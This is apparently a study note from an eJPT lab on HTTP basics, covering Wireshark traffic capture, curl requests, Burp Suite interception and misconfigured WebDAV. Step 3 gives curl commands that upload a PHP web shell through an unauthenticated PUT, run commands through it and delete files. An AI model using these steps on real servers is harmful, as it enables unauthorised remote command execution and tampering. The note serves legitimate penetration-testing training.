---
title: HTTP Basics Lab
tags: [eJPT, WebApp, HTTP, Wireshark, curl, BurpSuite, TCP, Repeater, WebDAV, PUT]
created: 2026-06-21
source: Transcripts
---

# HTTP Basics Lab

**Related:** [[HTTP-Requests]] | [[HTTP-Responses]] | [[Introduction-to-HTTP]] | [[Crawling-and-Spidering]] | [[00-INDEX]]

---

## Lab Objective

Put HTTP theory into practice by:
1. Observing TCP and HTTP traffic at the packet level with **Wireshark**
2. Manually crafting HTTP requests with **curl**
3. Intercepting, modifying, and replaying requests with **Burp Suite**
4. Exploiting a misconfigured directory via dangerous HTTP methods (PUT/DELETE)

---

## Step 1 — TCP and HTTP Traffic Analysis with Wireshark

### Starting Wireshark on the Correct Interface

```bash
# Must launch from terminal to capture on eth1 (the lab network interface)
wireshark -i eth1
```

> Launching Wireshark from the desktop shortcut may not list `eth1` as an available interface. Always start from the terminal in the lab environment.

### What You See When Loading a Web Page

When you reload the target web application in the browser, Wireshark captures:

**1. TCP Three-Way Handshake (before any HTTP traffic):**

```
Step 1: Client → Server    [SYN]          # Client initiates connection
Step 2: Server → Client    [SYN, ACK]     # Server acknowledges and responds
Step 3: Client → Server    [ACK]          # Client confirms — connection established
```

Only after the three-way handshake completes does HTTP traffic begin.

**2. HTTP Request (after TCP established):**
- Protocol: HTTP
- Info column shows: `GET / HTTP/1.1`
- Click the packet → expand `Hypertext Transfer Protocol` in the packet details pane
- You can see the full request line, all headers, and the body (if present)

**3. HTTP Response:**
- `HTTP/1.1 200 OK` visible in the response packet
- Response body contains the HTML file

**4. Subsequent Requests (HTTP 1.1 connection reuse):**
- After the initial HTML loads, the browser automatically makes more GET requests for linked resources (CSS, JS, fonts)
- All reuse the same TCP connection

### Verifying HTTP 1.1 Persistent Connection

```bash
# In a separate terminal while the page is open
netstat -ntp
# Look for ESTABLISHED connections to the web server IP on port 80
# These are the maintained TCP sessions from HTTP 1.1 keep-alive
```

### Exporting Resources from Wireshark

```
File → Export Objects → HTTP
```

Lists all files transferred in the capture (HTML, CSS, JavaScript, fonts). Useful to reconstruct what the server sent.

---

## Step 2 — HTTP Requests with curl

```bash
# Basic GET request — verbose (shows request + response headers + body)
curl -v http://<target-ip>

# HEAD request — response headers only, no body
curl -I http://<target-ip>
# equivalent:
curl -v -X HEAD http://<target-ip>

# OPTIONS request — enumerate supported HTTP methods for a resource
curl -v -X OPTIONS http://<target-ip>/uploads/

# PUT request — attempt to upload a file
curl http://<target-ip>/uploads/ --upload-file /path/to/file.php

# DELETE request — attempt to delete a file
curl -v -X DELETE http://<target-ip>/uploads/shell.php
```

### What to Look For in curl Output

```bash
curl -v http://target-ip
```

Key response headers revealed:
- `Server: Apache/2.4.7 (Ubuntu)` → web server + OS
- `X-Powered-By: PHP/5.5.9-1ubuntu4.29` → backend language + Ubuntu version hint
- `Set-Cookie: PHPSESSID=...` → session cookie; `PHPSESSID` confirms PHP backend
- `Cache-Control: no-cache` → caching policy

### Checking Supported Methods

```bash
curl -v -X OPTIONS http://target-ip/uploads/
# Response "Allow:" header lists accepted methods:
# Allow: GET, HEAD, OPTIONS, POST, PUT, DELETE, COPY, MOVE, LOCK
```

> If `PUT` or `DELETE` appear in the Allow header without authentication, this is a critical misconfiguration. It means anonymous users can upload or delete files.

---

## Step 3 — WebDAV and File Upload via PUT

**WebDAV** (Web Distributed Authoring and Versioning) is a protocol extension to HTTP that allows users to copy, move, create, and edit files on a web server. Identified by:
- `DAV:` header in OPTIONS response
- Methods like `COPY`, `MOVE`, `LOCK` in the `Allow:` header

### Uploading a Web Shell

If PUT is enabled and the directory is writable:

```bash
# Upload a PHP web shell to the uploads directory
curl http://target-ip/uploads/ --upload-file /usr/share/webshells/php/simple-backdoor.php

# Verify upload by browsing to:
# http://target-ip/uploads/simple-backdoor.php

# Execute commands via the web shell
# http://target-ip/uploads/simple-backdoor.php?cmd=whoami
# http://target-ip/uploads/simple-backdoor.php?cmd=id
```

> Web shell must match the backend language. If the server runs PHP (`.php` files, `X-Powered-By: PHP`), upload a PHP shell — not Python, not ASH.

### Deleting a File via DELETE

```bash
curl -v -X DELETE http://target-ip/uploads/simple-backdoor.php
# 204 No Content = success (file deleted)
```

---

## Step 4 — Burp Suite Workflow

### Setup

1. In Firefox, enable the **FoxyProxy** Burp Suite profile (routes browser traffic through Burp's proxy on `localhost:8080`)
2. Launch Burp Suite → Temporary Project → Start
3. In Burp: `Proxy` tab → `Intercept` → set to **On**

### Intercepting and Forwarding Requests

When you load a page in Firefox, Burp intercepts it before it reaches the server:
- **Forward** → sends the request to the server as-is
- **Drop** → discards the request (server never receives it)
- Modify any field in the intercepted request before forwarding

### HTTP History

`Proxy` → `HTTP History` tab:
- View every request and its corresponding response
- Click a request → `Request` tab shows what was sent; `Response` tab shows what the server returned
- Use this to review requests without needing to intercept each one live

### Repeater — Rapid Testing

1. In HTTP History or Intercept, right-click a request → `Send to Repeater`
2. Go to `Repeater` tab
3. Modify the request (change method, resource, headers, body) and click `Send`
4. View the raw response on the right side

**Use cases for Repeater:**
- Test a different resource path (e.g., change `/` to `/admin` → see if it's 403 or 200)
- Test a different HTTP method (change `GET` to `OPTIONS` to see allowed methods)
- Brute-force test different parameter values manually
- Confirm a 404 vs. 403 (resource exists but forbidden vs. truly not found)

### Intercepting a Login POST Request

1. Navigate to the login form in the browser (Burp intercept ON)
2. Enter test credentials and click submit
3. Burp intercepts the POST request — you see:
   - Method is `POST` (not GET — data is being sent)
   - Body contains: `name=test&password=test`
   - `Content-Type: application/x-www-form-urlencoded`
4. Credentials are in the **request body**, not the URL

---

## HTTP Status Codes Encountered in the Lab

| Code | Scenario |
|---|---|
| **200 OK** | Resource exists and was returned |
| **204 No Content** | DELETE was successful — resource removed |
| **302 Found** | Redirect — Burp Suite "Follow redirects" option handles this |
| **404 Not Found** | Resource doesn't exist (confirms directory brute-force missed it) |
| **405 Method Not Allowed** | Method not supported on that URL (e.g., PUT on root `/`) |

---

## Key Takeaways

- HTTP runs on top of TCP — the TCP three-way handshake (SYN/SYN-ACK/ACK) happens **before** the first HTTP request
- Wireshark captures both TCP and HTTP layers — useful for understanding what actually happens when a page loads
- **curl** is a quick way to craft custom HTTP requests, change methods, and view raw responses without a browser
- **OPTIONS** method reveals what HTTP methods are enabled — if `PUT` or `DELETE` appear, test for unauthorized file upload/deletion
- **WebDAV** (`DAV:` response header, `COPY`/`MOVE`/`LOCK` methods) indicates file management capabilities on the server
- Burp Suite **Repeater** enables rapid modification and retesting of individual requests — essential for web app pen testing
- On login forms, credentials travel in the **POST body** (`name=admin&password=...`) — interceptable with Burp Suite over plain HTTP
